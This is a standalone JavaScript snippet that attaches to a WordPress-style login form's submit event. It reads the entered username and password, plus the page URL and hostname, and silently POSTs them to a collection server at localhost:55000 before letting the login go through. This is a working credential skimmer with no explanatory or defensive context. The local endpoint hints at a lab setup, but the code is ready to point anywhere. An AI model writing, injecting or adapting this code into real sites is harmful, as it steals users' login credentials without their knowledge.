document.getElementById('loginform').addEventListener('submit', function(event) {
    var login = document.getElementById("user_login").value;
    var passwd = document.getElementById("user_pass").value;
    var url = document.location.href;
    var origin = document.location.hostname;
    var server = "http://localhost:55000/data"

    event.preventDefault();

    fetch(server, {
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            url: url,
            user: login,
            passw: passwd,
            origin: origin
        }),
        headers: {
            "Content-type": "application/json; charset=UTF-8"
        }
    }).then(response => {
        event.target.submit();
    });
});
